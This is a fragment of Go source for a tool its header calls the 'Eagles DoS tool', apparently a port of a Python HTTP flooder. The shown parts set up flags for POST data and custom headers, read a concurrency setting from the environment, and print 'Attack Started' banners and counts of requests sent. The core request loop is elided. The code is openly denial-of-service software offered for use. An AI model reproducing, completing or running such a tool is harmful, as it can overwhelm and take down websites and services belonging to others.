...
/*
 Eagles DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by Anaaas  
...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present eagles will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("EAGLESMAXPROCS")
	...
	if version {
		fmt.Println("EAGLES", __version__)
		os.Exit(0)
	}
	...
	go func() {
		fmt.Println("-- EAGLES Attack Started --\n           Go!\n\n")
		...
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- EAGLES Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
